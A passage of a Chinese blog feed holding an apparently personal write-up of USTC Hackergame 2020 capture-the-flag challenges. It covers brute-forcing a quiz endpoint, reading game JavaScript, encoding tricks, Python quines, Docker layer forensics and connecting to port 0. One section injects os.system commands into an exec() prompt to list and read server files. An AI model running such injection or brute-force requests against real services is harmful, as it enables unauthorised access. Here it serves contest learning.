rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 